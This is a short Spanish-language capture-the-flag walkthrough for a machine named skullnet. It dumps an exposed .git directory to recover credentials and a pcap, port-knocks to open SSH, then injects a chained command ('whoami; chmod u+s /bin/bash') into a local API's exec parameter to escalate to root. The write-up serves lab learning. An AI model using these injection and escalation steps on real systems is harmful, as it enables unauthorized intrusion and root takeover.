## Reconocimiento:

ttl = 64

Solo puerto 80:http y un dominio

```bash
dirsearch -u http://skullnet.es
```

La pagina no muestra mucho y se encuentra el directorio .git

```bash
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper/
bash gitdumper.sh http://skullnet.es/.git/ git_skullnet
```

Hay un hash interestante

```bash
git show HASH
Se ve que se borró un archivo y lo recuperamos
git log --all -- authentication.txt
Hay un commit nuevo con un hash
git show NUEVO_HASH
Revela credenciales y recuperamos el archivo .pcap
git show NUEVO_HASH:network.pcap > network.pcap
```

Abrirlo con Wireshark

Se detecta que la IP se esta conectando a ssh haciendo portnocking por 3 puertos : 1000 , 12000 y 5000 

```bash
knock -v IP 1000 12000 5000
```

Y se habilita el servicio ssh:22

User : skulloperator

## Escalada:

ps aux y encontramos un archivo interesante skullnet_api.py

Para conocer el puerto: netstat -punta 

8081

Contiene una API_KEY de una API codificada en Base64 y descodificada : 

we_are_bones_513546516486484

```bash
curl -H "Authorization: Basic we_are_bones_513546516486484" "http://127.0.0.1:8081/?exec=ls%20-la"
```

Es posible ejecutar comandos despues de ls o whoami

encodear  ‘;chmod u+s /bin/bash’ con urlencode desde bash

 

```bash
curl -H "Authorization: Basic we_are_bones_513546516486484" "http://127.0.0.1:8081/?exec=whoami%3B%20chmod%20u%2Bs%20%2Fbin%2Fbash"
```

ls -la /bin/bash 

bash -p
